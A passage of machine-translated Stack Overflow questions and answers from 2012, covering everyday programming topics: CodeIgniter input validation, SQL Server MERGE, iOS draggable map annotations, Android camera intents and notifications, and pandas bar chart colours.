                                <DataTemplate>
                                    <Grid>
                                        <Label Height="30"
                                               Margin="7,0,0,0"
                                               HorizontalAlignment="left"
                                               VerticalAlignment="Center"
                                               Content="{Binding Path=Username}"
                                               Foreground="Black" />
                                    </Grid>
                                </DataTemplate>
                            </GridViewColumn.CellTemplate>
                        </GridViewColumn>
                        <GridViewColumn> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T05:52:04.597

我认为 ListView 默认不支持排序。你需要创建附加的依赖属性来处理排序。

参考 -[单击列标题时自动对 GridView 进行排序](http://www.thomaslevesque.com/2009/03/27/wpf-automatically-sort-a-gridview-when-a-column-header-is-clicked/)

# php - 如何快速检查 CodeIgniter 中的 GET 和 POST 变量是否同时设置和数字？

> ID：11927690
> 
> 赞同：0
> 
> 时间：2012-08-13T02:59:13.350
> 
> 标签：php, validation, codeigniter, post, get

如何快速验证 CodeIgniter 中的 a `GET`or`POST`变量是否既已设置又为数字以用作视图中的错误或状态消息？

每次我想检查变量时，每次都做这样的事情是非常乏味的：

```
if ($this->input->get('error', True)) {
    if (is_numeric($this->input->get('error', True))) {
        $data['error'] = $this->input->get('error', True);
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T02:59:13.350

## CodeIgniter 的 get_numeric_input()

> 混合**get_numeric_input** ( 字符串*$name* [, bool *$required* = *True* [, string *$source* = *"GET"* [, bool *$xss_clean* = *True* ]]] )

下面是我创建的一个函数，因为我厌倦了检查 GET 和 POST 变量是否存在并且是数字的。

这主要用于处理错误或状态消息时，因为我可以使用`redirect("original_page.php?error=1");`将错误传递给原始页面。在原始页面上，我可以简单地`if (isset($error)) { … }`根据值执行并显示一条消息。但是，为了安全起见，有必要在将这些变量发送到视图之前检查这些变量。这个过程被证明是相当重复和乏味的。

下面这个函数要添加到底部`wwwroot/application/system/core/Input.php`

它的用途如下：

**示例 1：**

```
function index() {
   if ($error = $this->input->get_numeric_input('error', True, "GET", True)) {
      $data['error'] = $error;
   }
} 
```

在此示例中，如果`$_GET['error']`既是设置又是数字，它将设置`$data['error']`为该值。如果它未设置和/或不是数字，它将**终止**脚本。

**示例 2：**

```
function index() {
   if ($error = $this->input->get_numeric_input('error', False, "POST", True)) {
      $data['error'] = $error;
   }
} 
```

在此示例中，如果`$_POST['error']`既是设置又是数字，它将设置`$data['error']`为该值。如果它没有设置和/或不是数字，它将*继续*并且不会在 $data 数组中设置任何值。

第一个参数是要检查的变量名。第二个变量是使检查是否需要的布尔值。如果您将此设置为 TRUE，则如果未设置变量或如果它不是数字，它将显示错误并立即终止脚本。如果设置为 False，那么它将简单地返回 False，脚本将继续运行。第三个变量是 POST 或 GET，它将确定函数是否在 $_GET 或 $_POST 数组中查找变量。最后，第四个变量指示返回时值是否为 XSS_CLEAN。

**注意：**第二个、第三个和第四个参数都是可选的，并且分别默认为 True、“GET”和 True。

这是代码：

```
function get_numeric_input($name, $required = True, $source = "GET", $xss_clean = True) {
    if ($source === "GET") {
        if ($this->get($name, $xss_clean)) {
            if (is_numeric($this->get($name, $xss_clean))) {
                return $this->get($name, $xss_clean);
            } else {
                if ($required) {
                    show_error("$source variable $name is not numeric!");
                    log_message('error', "$source variable $name is not numeric!");
                    return False;
                } else {
                    return False;
                }
            }
        } else {
            if ($required) {
                show_error("$source variable $name is not set!");
                log_message('error', "$source variable $name is not set!");
                return False;
            } else {
                return False;
            }
        }
    } elseif ($source === "POST") {
        if ($this->post($name, $xss_clean)) {
            if (is_numeric($this->post($name, $xss_clean))) {
                return $this->post($name, $xss_clean);
            } else {
                if ($required) {
                    show_error("$source variable $name is not numeric!");
                    log_message('error', "$source variable $name is not numeric!");
                    return False;
                } else {
                    return False;
                }
            }
        } else {
            if ($required) {
                show_error("$source variable $name is not set!");
                log_message('error', "$source variable $name is not set!");
                return False;
            } else {
                return False;
            }
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T20:06:50.350

一种可能的替代方法是扩展表单验证，以便您也可以验证 $_GET。使用表单验证库确实可以节省时间 imo（扩展版本 - 适合您的需求 - 是可取的）。 [CodeIgniter 验证：可以验证 GET 查询字符串吗？](https://stackoverflow.com/questions/10883949/codeigniter-validation-possible-to-validate-get-query-strings)谈到这个。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-03T06:41:54.017

只需使用中间变量即可获得简短而快速的代码：

```
$input_error = $this->input->get('error');
$data['error'] = ctype_digit($input_error) ? $input_error : FALSE; 
```

如果你真的想要一个单行：

```
function validate_integer_input($input) {
    return ctype_digit($input) ? $input : FALSE;
}

$data['error'] = validate_integer_input($this->input->get('error')); 
```

*   `$data['error']`将始终设置，这是一件好事，因为`$data`将始终设置在您的视图中，因此您可以简单地做`if ($data)`而不是`if (isset($data))`.
*   在处理 GET 和 POST 输入时，您必须了解输入的某些方面。对于最重要的：
    *   一个 GET/POST 输入，当然，如果它被设置了，它总是字符串类型。
    *   只有`''`(空) 和`'0'`字符串[评估](http://www.php.net/manual/en/language.types.boolean.php#language.types.boolean.casting)为 FALSE，所有其他值评估为 TRUE。
    *   [`ctype_digit()`](http://www.php.net/manual/en/function.ctype-digit.php)需要一个字符串，但此代码可能会将其传递为 FALSE（来自 CI->input）。但这很好，因为 FALSE[强制转换](http://www.php.net/manual/en/language.types.string.php#language.types.string.casting)为空字符串。

附带说明一下，这种情况不需要 XSS 过滤。

*   XSS 过滤具有相当大的性能影响，应仅在需要时激活。一个经验法则是，对于在 HTML 源中的任何位置显示或包含的数据都需要过滤。
*   对于这种情况，我们已经确保输入只能包含数字，所以我们是安全的。

# ios - iOS - MKMapView - 可拖动注释

> ID：11927692
> 
> 赞同：7
> 
> 时间：2012-08-13T02:59:15.567
> 
> 标签：ios, xcode, annotations, mkmapview, draggable

我已准备好注释，但试图弄清楚如何使用我的代码使其可拖动：

```
-(IBAction) updateLocation:(id)sender{

    MKCoordinateRegion newRegion;

    newRegion.center.latitude = mapView.userLocation.location.coordinate.latitude;
    newRegion.center.longitude = mapView.userLocation.location.coordinate.longitude;

    newRegion.span.latitudeDelta = 0.0004f;
    newRegion.span.longitudeDelta = 0.0004f;

    [mapView setRegion: newRegion animated: YES];

    CLLocationCoordinate2D coordinate;
    coordinate.latitude = mapView.userLocation.location.coordinate.latitude;
    coordinate.longitude = mapView.userLocation.location.coordinate.longitude;

    MKPointAnnotation *annotation = [[MKPointAnnotation alloc] init];

    [annotation setCoordinate: coordinate];
    [annotation setTitle: @"Your Car is parked here"];
    [annotation setSubtitle: @"Come here for pepsi"];

    [mapView addAnnotation: annotation];
    [mapView setZoomEnabled: YES];
    [mapView setScrollEnabled: YES];
} 
```

提前致谢！

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-08-13T03:25:34.803

要使注释可拖动，请将注释*视图的* `draggable`属性设置为`YES`。

这通常在`viewForAnnotation`委托方法中完成。

例如：

```
- (MKAnnotationView *)mapView:(MKMapView *)mapView viewForAnnotation:(id<MKAnnotation>)annotation
{
    if ([annotation isKindOfClass:[MKUserLocation class]])
        return nil;

    static NSString *reuseId = @"pin";
    MKPinAnnotationView *pav = (MKPinAnnotationView *)[mapView dequeueReusableAnnotationViewWithIdentifier:reuseId];
    if (pav == nil)
    {
        pav = [[MKPinAnnotationView alloc] initWithAnnotation:annotation reuseIdentifier:reuseId];
        pav.draggable = YES;
        pav.canShowCallout = YES;
    }
    else
    {
        pav.annotation = annotation;
    }

    return pav;
} 
```

如果需要在用户停止拖拽注解时进行处理，请参见：
[IOS上MKAnnotationView如何管理拖拽？](https://stackoverflow.com/questions/3998765/how-to-manage-drag-and-drop-for-mkannotationview-on-ios)

此外，您的注释对象（实现的对象`MKAnnotation`）应该具有可设置的`coordinate`属性。您正在使用`MKPointAnnotation`确实实现的类，`setCoordinate`因此该部分已经得到处理。

# sql - Upsert 修改排除的行？

> ID：11927696
> 
> 赞同：1
> 
> 时间：2012-08-13T02:59:43.507
> 
> 标签：sql, sql-server, sql-server-2008, merge

我有两张桌子：

**表 1**：

```
ID ColA ColB Status 
```

**表 2**：

```
ColA ColB 
```

我正在尝试以以下方式将**表 2**`MERGE`中的记录记录到**表 1**中：

 ****1.  **对于表 1中的****表 2**中的每一行，我设置**`Status = 1`**
***   对于**表 2**中不存在于表 1 中的每一行，我将该行插入到**表 1**中并设置`Status = 1`*   对于**表 1**中不存在于**表 2**中的每一行，设置`Status = 0`**

 **是否有可能在一个声明中做到这一点？`1`目前，我能够实现`2`但不确定如何获得第三个：

```
MERGE INTO dbo.Table1 WITH(HOLDLOCK) AS Target
USING dbo.Table2 AS Source
ON Target.ColA = Source.ColA AND Target.ColB = Source.ColB
WHEN MATCHED THEN
    UPDATE SET Target.Status = 1
WHEN NOT MATCHED THEN
    INSERT (ColA, ColB, Status) VALUES(Source.ColA, Source.ColB, 1); 
```

关于如何`3`在同一声明中实现的任何建议？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T03:09:27.420

您想要“NOT MATCHED BY SOURCE”子句。

```
MERGE INTO dbo.Table1 WITH(HOLDLOCK) AS Target
USING dbo.Table2 AS Source
ON Target.ColA = Source.ColA AND Target.ColB = Source.ColB
WHEN MATCHED THEN
    UPDATE SET Status = 1
WHEN NOT MATCHED THEN
    INSERT (ColA, ColB, Status) VALUES(Source.ColA, Source.ColB, 1)
WHEN NOT MATCHED BY SOURCE THEN
    UPDATE SET Status = 0
; 
```******

# javascript - Chrome、firefox 或 opera 预加载更改

> ID：11927698
> 
> 赞同：0
> 
> 时间：2012-08-13T03:00:09.217
> 
> 标签：javascript, firefox, google-chrome, browser, opera

有没有办法在上述浏览器之一中“编辑”“服务器端”javascript文件，将js编辑保存在客户端并替换服务器端脚本？

基本上我想编辑服务器上的 javascripts。显然我无法将它们保存在服务器上，因此需要将它们保存在客户端（我的计算机）上，而浏览器需要加载我的脚本。

这应该不难做到，但我一直无法找到任何方法来实现这一点。

* * *

编辑：

我想从我不拥有或也没有写入权限的站点修改 javascript。例如，

Html 页面在服务器上使用了一些 javascript 页面。我想修改这个 javascript 文件（实际文件）。

我可以下载并保存 javascript 文件，但 html 页面将始终使用服务器上的那个，因为那是脚本标签中的内容。在执行 html 页面的脚本之前，我需要修改 html 页面的脚本标记以指向本地 javascript 文件（否则将使用来自服务器的 javascript）。

例如，这里是来自 SE 的脚本标签：

```
 <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"></script> 
```

它使用非本地 javascript 文件。在执行任何 javascript 之前，我需要用我自己的行替换这一行。它想：

```
 <script type="text/javascript" src="file://C:/temp/myjquery.min.js"></script> 
```

管他呢。（这样，我可以修改 jquery 文件并让它在服务器上执行我自己的版本）

我当然可以下载 html 文件并对其进行修改，但是 php 代码可能无法正常工作。（例如，相关链接将被破坏）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T18:48:47.407

这在 Opera 中通常非常简单：只需查看源代码、编辑您想要的内容并使用特殊的“工具 > 高级 > 从缓存重新加载”命令**而不是**正常的重新加载。瞧，您将使用修改后的脚本运行该站点..

（有一些例外，与某些网站使用的特定无缓存技术相关，它不会对所有文件 100% 有效 - 但它肯定适用于从 googleapis.com 提供的任何内容）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T03:16:54.043

没问题，您想为此使用书签。确实很简单，只需要记住使用匿名自动执行功能：`javascript:(function(){ //commands })();`
在*过去，*人们甚至可以将此 javascript 直接放入您的地址中，但现在一些浏览器构建器（例如我们编码人员过去信任的 firefox）正在做一个“好孩子”，并听取 facebook 的“要求”，以终止正常的标准功能，以支持他们缺乏理解闭包……但是，唉……当然，您也可以创建一个书签来修复 Firefox 的精神错乱，再次收回权力用户 ：）

每次访问该站点时，您都​​会单击书签。完毕。
只要您在同一页面上（如果您真的想要），甚至可以使其“抗记忆”。自然地，权力在于用户/访问者*，*而不是网站管理员（他已经公开分享了任何信息）。

您还可以在 firefox 和类似的解决方案上查看greasemonky。

祝你好运

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-13T03:20:13.247

我认为您正在寻找的是[LiveReload](http://livereload.com/)

它允许您编辑 css 文件并让浏览器应用更改而无需刷新浏览器。

Windows 版本现在处于 alpha 阶段，但 Mac 版本的 CSS 效果很好。

我不知道它是否支持 Javascript，但我认为它可能。

你也可以试试[Chrome DevTools](https://github.com/NV/chrome-devtools-autosave/)。这是一个 chrome 扩展，可以用 javascript 和 css 做你想要的。

* * *

## 回答 #4

> 赞同：-2
> 
> 时间：2012-08-13T03:03:36.533

在服务器端构建一个字符串以在服务器端编写所有 javascript 代码。

# function - 致命错误：在非对象上调用成员函数 Show_LastRec_Pack()

> ID：11927700
> 
> 赞同：0
> 
> 时间：2012-08-13T03:00:30.717
> 
> 标签：function, php

已经5天了，还是不知道哪里出了问题！所以在这里我发布错误和整个代码。希望有人可以提供帮助！我会非常感激。

```
Fatal error: Call to a member function Show_LastRec_Pack() on a non-object in packgames.php on line 69 
```

这是“packgames.php”：

```
<?
/**
 * Block Last Rec Pack
 **/
define ('PACK_GAMES_TO_SHOW', 3);

require_once ('recmod/constants.php');

$query = "SELECT r.*, pp.topic_id, p.Nick, b.*, p.Rating
            FROM " . TABLE_RECGAMES . " r,  " . $this->db->obj['sql_tbl_prefix'] . "attachments a, " . $this->db->obj['sql_tbl_prefix'] . "posts pp,
                " . TABLE_PLAYERS." p, recs_aoc_flags b
            WHERE a.attach_id = r.attach_id 
                AND a.attach_rel_id = pp.pid 
                AND r.Id_Player > 0
                AND p.Id_Player = r.Id_Player
                AND b.flag_id = p.flag_id
            ORDER BY r.Id_RecordedGame DESC
            LIMIT " . PACK_GAMES_TO_SHOW;

$this->DB->query($query);       
$packs = array ();
while ($player = $this->DB->fetch ())
{
    $flag = '<img src="' . PATH_FLAGS . $player['flag_image'] . '" alt="'.$player['flag_country'].'" title="' . $player['flag_country'] . '" align="absmiddle" border="0">';

    $packs[] = array (
      'GAMES' => $player['Players'],
      'PLAYER' => $player['Nick'],
      'FLAG' => $flag,
      'RATING' => $player['Rating'],
      'ID_POST' => $player['topic_id']
    );
}
$tmp = $this->registry->getClass('output')->getTemplate('recgames')->Show_LastRec_Pack ($packs);    
echo $tmp;
?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T03:05:00.647

无论该对象调用模板返回什么，它都不是对象。在调用链上执行一些 var_dumps() 并找出返回 null 或其他非对象的位置。最有可能在`getTemplate()`.

# android - 在 OpenGL 中同时使用多个渲染器

> ID：11927702
> 
> 赞同：1
> 
> 时间：2012-08-13T03:00:38.670
> 
> 标签：android, opengl-es-2.0

如果图形的一部分没有变化，例如背景，而其他部分经常变化，那么将单独的透明 GLSurfaceView 和 Renderer 叠加起来，一个用于静态部分，另一个用于变化的部分，是否会更有效，这样不变的部分不必不断重绘？

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T09:08:43.750

多个 GLSurfaceViews 是可能的。

如果出现以下情况，单独的 GLSurfaceViews 不是一个好主意：
1] 表面之间有很多重叠（正在占用视频内存）
2] 如果需要多次同时更新多个 GLSurfaceViews（GL 上下文切换会导致可怕的性能。）

如果这两种情况不适合您，那么绝对可以选择多个 GLSuraceViews。

# xpages - 如何在 xpinc 中获取打印语句？

> ID：11927703
> 
> 赞同：0
> 
> 时间：2012-08-13T03:01:01.797
> 
> 标签：xpages, lotus-domino, lotusscript, xpinc

我已经在 XPages 中成功创建了一个视图，其中包含我所有的 lotusscript 代理的列表和一个用于运行所选代理的按钮。当我选择任何一个代理并运行它时，它成功运行但所有打印语句都没有出现。我检查了我的代码，我的打印代码在那里。从设计器运行我的代理，打印语句确实出现了。这是由于xpinc的限制吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T07:28:37.420

打印语句进入控制台。因此，您应该在 log.nsf 中找到它们，您也可以使用 -rparams -console 启动客户端以获取控制台。当然，您可以按照[此示例](http://www.wissel.net/blog/d6plinks/SHWL-8SF7AH)将打印件发送到您可以处理的地方。或者 - 如果打印用于调试目的，请使用 OpenNTF 的[调试工具栏](http://www.openntf.org/internal/home.nsf/project.xsp?action=openDocument&name=XPage%20Debug%20Toolbar)。

# java - Java中的HTTP v Socket v RMI聊天

> ID：11927705
> 
> 赞同：0
> 
> 时间：2012-08-13T03:01:19.767
> 
> 标签：java, http, sockets, chat, rmi

我正在尝试将聊天 servlet 与我的 JSP 页面集成。我需要决定是否使用 HTTP v Socket v RMI 进行聊天通信？我有几个问题 1\. 这些协议中哪些是最开放的（即受防火墙、阻塞端口、反病毒/垃圾邮件阻止的限制最少） 2\. 其中哪些提供更好的性能？3\. 是否有浏览器限制（我需要在 IE、Chrome、Firefox、Safari 等上使用聊天功能。

非常感谢帮助。

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T03:23:29.723

> 这些协议中哪一个是最开放的（即受防火墙、阻塞端口、反病毒/垃圾邮件阻止的限制最少）

肯定是 HTTP。

> 其中哪一个提供更好的性能？

很难说。在实践中，我认为它更多地取决于实现而不是协议本身。

> 是否有任何浏览器限制（我需要在 IE、Chrome、Firefox、Safari 等上使用聊天功能？

我怀疑没有特定于浏览器的限制。但是，如果您运行的是不受信任的小程序，Java 安全沙箱会阻止很多事情，包括小程序可以通过网络连接到的主机。有关不受信任的小程序可以/不能做什么的详细信息，请阅读以下内容： http: [//docs.oracle.com/javase/tutorial/deployment/applet/security.html](http://docs.oracle.com/javase/tutorial/deployment/applet/security.html)

# android - 使用android中的另一个活动从捕获中获取图像并在另一个布局中显示图像

> ID：11927710
> 
> 赞同：4
> 
> 时间：2012-08-13T03:02:01.693
> 
> 标签：android, android-camera

我想通过单击 FirstActivity 中的 Capture 按钮在捕获后显示图像，并使用 SecondActivity 在 activity_second(layout) 中显示图像。

第一活动

```
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_first);

    Button take_photo = (Button) findViewById(R.id.btn_capture);
    take_photo.setOnClickListener(new OnClickListener() {

            public void onClick(View v) {
                Intent i = new Intent(android.provider.MediaStore.ACTION_IMAGE_CAPTURE);
                startActivity(i);
            }
        });
} 
```

布局活动_first

```
> <RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent" >

    <Button
        android:id="@+id/btn_capture"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_alignParentLeft="true"
        android:layout_alignParentTop="true"
        android:layout_marginLeft="21dp"
        android:text="Capture" />

</RelativeLayout> 
```

第二活动

```
> public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_second);

        ImageView view = (ImageView) findViewById(R.id.view_photo);
    } 
```

活动_秒

```
> <?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical" >

    <ImageView
        android:id="@+id/view_photo"
        android:layout_width="260dp"
        android:layout_height="374dp" />

</LinearLayout> 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-13T04:12:58.183

使用 startActivityForResult() 而不是 startActivity()

```
@Override
protected void onActivityResult(int requestCode, int resultCode, Intent data) {
    // TODO Auto-generated method stub
    super.onActivityResult(requestCode, resultCode, data);
    Bitmap thumbnail = null;
    if (requestCode == CAMERA_PIC_REQUEST) {
        if (resultCode == RESULT_OK) {
            thumbnail = (Bitmap) data.getExtras().get("data");
            Intent i = new Intent(this, NextActivity.class);
            i.putExtra("name", thumbnail);
            startActivity(i);
        }
    }
} 
```

接下来在下一个活动中尝试使用这个

```
protected void onCreate(Bundle savedInstanceState) {
    //TODO Auto-generated method stub
    super.onCreate(savedInstanceState);
    //intialize the image view 

    Bitmap bitmap  = getIntent().getExtras().getParcelable("name");
    //set the image here.
} 
```

希望这可以帮助你

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-14T00:09:38.953

您可以使用以下代码来解决问题：

您的第一个活动：

```
private static final int CAPTURE_IMAGE_ACTIVITY_REQUEST_CODE = 100;

    @Override
    public void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_first);
        Button take_photo = (Button) findViewById(R.id.btn_capture);
        take_photo.setOnClickListener(new OnClickListener() 
        {
            public void onClick(View v) 
            {
                // create Intent to take a picture and return control to the calling application
                Intent intent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
                // start the image capture Intent
                startActivityForResult(intent, CAPTURE_IMAGE_ACTIVITY_REQUEST_CODE);
            }
        });
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) 
    {
        if (requestCode == CAPTURE_IMAGE_ACTIVITY_REQUEST_CODE) 
        {
            Bitmap imageData = null;
            if (resultCode == RESULT_OK) 
            {
                imageData = (Bitmap) data.getExtras().get("data");

                Intent i = new Intent(this, SecondActivity.class);
                i.putExtra("name", imageData );
                startActivity(i);

            } 
            else if (resultCode == RESULT_CANCELED) 
            {
                // User cancelled the image capture
            } 
            else 
            {
                // Image capture failed, advise user
            }
        }
    } 
```

第二个活动：

```
public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_second);
        Bitmap bitmap  = getIntent().getExtras().getParcelable("name");
        ImageView view = (ImageView) findViewById(R.id.view_photo);
        view.setImageBitmap(bitmap); 
    } 
```

并在 Manifest.xml 文件中使用权限：

```
<uses-feature android:name="android.hardware.camera" /> 
```

我希望这会正常工作

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-13T04:02:09.797

```
public void onClick(View v) 
    {
    Intent intent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);                    
    mImageCaptureUri = Uri.fromFile(new File(Environment.getExternalStorageDirectory(),
                                       "image" + String.valueOf(System.currentTimeMillis()) + ".jpg"));
    try 
        {                       
            startActivityForResult(intent, PICK_FROM_CAMERA);
        } 
    catch (ActivityNotFoundException e) 
        {
            e.printStackTrace();
        }
    }

protected void onActivityResult(int requestCode, int resultCode, Intent data) 
    {
        if (resultCode != RESULT_OK) return;       
        switch (requestCode) 
            {
                case PICK_FROM_CAMERA:
                    Bitmap photo =  null;           
                    Bundle extras = data.getExtras();
                    if (extras != null) 
                    {               
                        photo = extras.getParcelable("data");
                    }   
                    Intent i =  new Intent(this,SecondActivity.class);
                    i.putExtra("image", photo);
                    startActivity(i);
                    break;  
    } 
```

在第二个活动中：

```
 bMap =  getIntent().getParcelableExtra("image");
    mImageView.setImageBitmap(bMap); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-13T03:43:32.033

获取您存储的图像的路径，并将其作为额外的使用意图传递给 onActivityResult() 中的其他活动。希望这可以帮助你。

# usb - 如何捕获特定 USB 设备的签名并在未来对其进行仿真？

> ID：11927711
> 
> 赞同：-1
> 
> 时间：2012-08-13T03:02:08.670
> 
> 标签：usb, hardware, emulation

我的软件需要特定的硬件才能正常工作。我有硬件，但并不总是需要连接它才能使用软件。我不需要模拟设备的功能，只需模拟它已插入的事实。

有没有办法读取 USB 设备如何表示自身，然后在软件中模拟该签名？

我在 Mac OSX 10.7 上

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-06-25T22:06:46.563

我可能会误解你，但每个 USB 设备都有一个唯一的供应商和产品 ID。您可以轻松地使用它来发现设备是否已插入并且是您正在寻找的设备。这篇[文章](https://stackoverflow.com/questions/17679480/details-on-usb-no-luck-so-far/17679571#17679571)详细介绍了这一点以及更多内容，但第一部分可能会有用。

总而言之，您必须查找供应商和产品 ID。然后枚举连接的设备并非常简单地检查 ID 是否匹配。如果是这样，那么您的设备已插入！

# java - 应用程序启动时不显示通知

> ID：11927712
> 
> 赞同：0
> 
> 时间：2012-08-13T03:02:12.743
> 
> 标签：java, android, notifications, alarmmanager

如果有任何事件发生，我有一个使用 AlarmManager 来安排通知的应用程序。这很好用。

问题是每次用户实例化应用程序时，如果是事件日，它会显示状态栏通知。我只想在应用程序不活动（即关闭）时显示状态栏通知。

```
@Override
public void onCreate(Bundle savedInstanceState)
{
        super.onCreate(savedInstanceState);
        setContentView(R.layout.simple_calendar_view);

        if (notification_value == true) {
            int dayOfEvent = day;
            if (notification_day == 1) {
                dayOfEvent = day + 1;

            }
            if(isHoliday(dayOfEvent, month, year))
            {
                String mn = monthName[month-1];
                String date_string = setParameter(year, mn, dayOfEvent);
                startAlarm(year, (month-1), day, hour, mins, date_string);
            }
        }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T04:40:17.187

要防止 AlarmManager 在您的应用程序运行时创建通知，只需在 onResume() 中使用[AlarmManager.cancel(PendingIntent intent)](http://developer.android.com/reference/android/app/AlarmManager.html#cancel%28android.app.PendingIntent%29)并在 onPause() 中重新创建警报。

来自 AlarmManager.cancel() 的 Android 文档：

> 删除任何具有匹配 Intent 的警报。任何类型的任何警报，其 Intent 与此匹配（由 filterEquals(Intent) 定义）都将被取消。

这表明您不必保留对旧警报的引用，*任何*具有匹配 Intent 的警报都将被取消。

最后，我不建议将代码移动到 onCreate() 和 onDestory，因为用户可以暂停应用程序（例如使用 Home 按钮），然后再被操作系统杀死。在这种情况下，永远不会调用 onDestroy() 方法。如果在应用程序处于后台时出现通知是不可接受的，请阅读有关如何跟踪应用程序实际被终止时间的详细答案：[检查 Android 应用程序是否在后台运行](https://stackoverflow.com/q/3667022/1267661)

# javascript - iFrame 是否计算页面浏览量？

> ID：11927713
> 
> 赞同：-2
> 
> 时间：2012-08-13T03:02:31.887
> 
> 标签：javascript, html, iframe

如果您在 iFrame 中加载网站，它是否算作他们的页面浏览量？

Google Analytics（分析）是否将其计为页面浏览量？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-13T03:06:31.730

如果 iframe 中有 Google Analytics 脚本，则任何主机页面加载 iframe 时都会触发该脚本，并将计为它自己的页面浏览量。

就 iframe 而言，它是一个独立的网页。它可以判断它是否被框住，但前提是它选择这样做。在所有其他方面，它都是一个普通的独立网页。

# python - 如何给 pandas/matplotlib 条形图自定义颜色

> ID：11927715
> 
> 赞同：99
> 
> 时间：2012-08-13T03:02:57.673
> 
> 标签：python, matplotlib, pandas

我刚开始使用 pandas/matplotlib 作为 Excel 的替代品来生成堆叠条形图。我遇到了一个问题

(1) 默认颜色图中只有 5 种颜色，所以如果我有超过 5 个类别，那么颜色会重复。如何指定更多颜色？理想情况下，具有起始颜色和结束颜色的渐变，以及在两者之间动态生成 n 种颜色的方法？

(2)颜色不是很赏心悦目。如何指定一组自定义的 n 颜色？或者，渐变也可以。

以下是说明上述两点的示例：

```
 4 from matplotlib import pyplot
  5 from pandas import *
  6 import random
  7 
  8 x = [{i:random.randint(1,5)} for i in range(10)]
  9 df = DataFrame(x)
 10 
 11 df.plot(kind='bar', stacked=True) 
```

输出是这样的：

![在此处输入图像描述](../Images/de63920fae9b6c1646efbf0c450729e7.png)

* * *

## 回答 #1

> 赞同：133
> 
> 时间：2012-08-13T03:39:34.913

您可以将`color`选项作为列表直接指定给`plot`函数。

```
from matplotlib import pyplot as plt
from itertools import cycle, islice
import pandas, numpy as np  # I find np.random.randint to be better

# Make the data
x = [{i:np.random.randint(1,5)} for i in range(10)]
df = pandas.DataFrame(x)

# Make a list by cycling through the colors you care about
# to match the length of your data.
my_colors = list(islice(cycle(['b', 'r', 'g', 'y', 'k']), None, len(df)))

# Specify this list of colors as the `color` option to `plot`.
df.plot(kind='bar', stacked=True, color=my_colors) 
```

要定义您自己的自定义列表，您可以执行以下一些操作，或者只需查找 Matplotlib 技术以通过其 RGB 值定义颜色项等。您可以根据需要变得复杂。

```
my_colors = ['g', 'b']*5 # <-- this concatenates the list to itself 5 times.
my_colors = [(0.5,0.4,0.5), (0.75, 0.75, 0.25)]*5 # <-- make two custom RGBs and repeat/alternate them over all the bar elements.
my_colors = [(x/10.0, x/20.0, 0.75) for x in range(len(df))] # <-- Quick gradient example along the Red/Green dimensions. 
```

最后一个示例为我生成了以下简单的颜色渐变：

![在此处输入图像描述](../Images/d5dd836feac790ecd79d6e167a17b1d8.png)

我没有玩足够长的时间来弄清楚如何强制图例拾取定义的颜色，但我相信你可以做到。

不过，一般来说，一个重要的建议是直接使用 Matplotlib 中的函数。从 Pandas 调用它们是可以的，但我发现直接从 Matplotlib 调用它们可以获得更好的选择和性能。

* * *

## 回答 #2

> 赞同：55
> 
> 时间：2016-08-01T22:50:51.950

我发现最简单的方法是将`colormap`参数 in`.plot()`与预设颜色渐变之一一起使用：

```
df.plot(kind='bar', stacked=True, colormap='Paired') 
```

[![在此处输入图像描述](../Images/2e90e3c9b8defdf0d21c0904f8c112f4.png)](https://i.stack.imgur.com/7BOTc.png)

您可以在此处找到大量[预设颜色图](http://scipy.github.io/old-wiki/pages/Cookbook/Matplotlib/Show_colormaps)。

[![颜色图](../Images/9a7d47608fae9af3b705d6b2966b6874.png)](https://i.stack.imgur.com/i5XZo.png)

* * *

## 回答 #3

> 赞同：17
> 
> 时间：2017-11-06T22:30:06.127

有关创建自己的颜色图的更详细答案，我强烈建议您访问[此页面](https://stackoverflow.com/questions/18926031/how-to-extract-a-subset-of-a-colormap-as-a-new-colormap-in-matplotlib)

如果这个答案工作量太大，您可以快速制作自己的颜色列表并将它们传递给`color`参数。所有颜色图都在`cm`matplotlib 模块中。让我们从反转的 inferno 颜色图中获取 30 个 RGB（加上 alpha）颜色值的列表。为此，首先获取颜色图，然后向其传递 0 到 1 之间的值序列。在这里，我们使用`np.linspace`创建 30 个 0.4 到 .8 之间的等距值来表示颜色图的该部分。

```
